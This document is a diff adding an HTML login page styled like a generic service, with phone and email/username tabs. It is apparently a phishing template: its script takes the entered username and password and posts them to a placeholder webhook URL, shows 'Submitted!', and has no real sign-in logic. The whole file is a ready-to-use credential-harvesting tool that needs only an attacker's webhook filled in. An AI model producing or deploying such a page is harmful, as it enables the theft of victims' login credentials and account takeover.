@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #fff;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 400px;
+    }
+
+    h2 {
+      text-align: center;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      font-size: 16px;
+      outline: none;
+    }
+
+    .forgot {
+      text-align: left;
+      font-size: 14px;
+      margin: 10px 0;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #eee;
+      border: none;
+      font-size: 16px;
+      color: #666;
+      cursor: pointer;
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    .tabs div {
+      margin: 0 10px;
+      padding-bottom: 5px;
+    }
+
+    .active {
+      border-bottom: 2px solid black;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Log in</h2>
+    <div class="tabs">
+      <div>Phone</div>
+      <div class="active">Email / Username</div>
+    </div>
+    <input type="text" id="username" placeholder="Email or username" />
+    <input type="password" id="password" placeholder="Password" />
+    <div class="forgot">Forgot password?</div>
+    <button onclick="sendLogin()">Log in</button>
+  </div>
+
+  <script>
+    function sendLogin() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      fetch("YOUR_WEBHOOK_URL_HERE", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          username: username,
+          password: password
+        })
+      }).then(() => {
+        alert("Submitted!");
+      }).catch(() => {
+        alert("Failed to send data.");
+      });
+    }
+  </script>
+</body>
+</html>
